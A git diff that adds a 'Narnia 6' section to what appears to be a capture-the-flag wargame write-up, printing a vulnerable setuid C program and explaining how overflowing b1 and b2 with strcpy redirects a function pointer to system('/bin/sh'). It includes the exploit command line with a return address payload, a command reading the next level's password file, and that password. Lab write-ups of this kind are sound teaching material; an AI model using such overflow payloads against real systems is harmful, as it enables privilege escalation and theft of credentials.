@@ -504,3 +504,73 @@ BAV0SUV0iM
 ```
 
 ![Get Shell - Narnia 5](assets/narnia5.png)
+
+## Narnia 6
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+extern char **environ;
+
+// tired of fixing values...
+// - morla
+unsigned long get_sp(void) {
+       __asm__("movl %esp,%eax\n\t"
+               "and $0xff000000, %eax"
+               );
+}
+
+int main(int argc, char *argv[]){
+	char b1[8], b2[8];
+	int  (*fp)(char *)=(int(*)(char *))&puts, i;
+
+	if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }
+
+	/* clear environ */
+	for(i=0; environ[i] != NULL; i++)
+		memset(environ[i], '\0', strlen(environ[i]));
+	/* clear argz    */
+	for(i=3; argv[i] != NULL; i++)
+		memset(argv[i], '\0', strlen(argv[i]));
+
+	strcpy(b1,argv[1]);
+	strcpy(b2,argv[2]);
+	//if(((unsigned long)fp & 0xff000000) == 0xff000000)
+	if(((unsigned long)fp & 0xff000000) == get_sp())
+		exit(-1);
+	setreuid(geteuid(),geteuid());
+    fp(b1);
+
+	exit(1);
+}
+```
+
+Narnia 6 may seem to be hard at first glance but it actually quite simple
+because the variable `fp` on the stack sits above `b1` and `b2`. 
+
+And since we can control the value in `b1` and `b2`, as well as overflow the
+stack as the program uses `strcpy` to set the content for `b1` and `b2`, we
+can do the following steps to capture the flag:
+
+1. find the address of `system`
+2. overflow `b1` so that `fp` points to `system` instead of `puts`
+3. overflow `b2` to set `b1` to `/bin/sh`
+
+And now once the program executes `fp(b1)`, it will actually do
+`system("/bin/sh")`, and everything is done.
+
+To get the address of `system`, we can use `gdb`, break at `main` and let it
+run the program. Once the program is running, it will load functions in libc,
+and now we can print the addres of `system`, which is `0xf7c48150`.
+
+![Get address of `system` - Narnia 6](assets/narnia6-gdb.png)
+
+```bash
+$ /narnia/narnia6 `echo -e 'AAAAAAAA\x50\x81\xc4\xf7'` AAAAAAAA/bin/sh
+$ cat /etc/narnia_pass/narnia7
+YY4F9UaB60
+```
+
+![Get shell - Narnia 6](assets/narnia6-getshell.png)
